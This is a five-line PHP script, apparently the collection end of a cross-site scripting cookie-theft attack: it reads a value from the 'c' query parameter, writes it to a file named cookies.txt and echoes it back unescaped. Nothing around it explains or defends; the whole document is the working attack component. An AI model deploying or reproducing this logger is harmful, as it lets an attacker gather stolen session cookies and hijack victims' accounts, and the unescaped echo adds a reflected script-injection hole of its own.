<?php
$text = $_GET["c"];
file_put_contents('cookies.txt', $text);
echo $text;
?>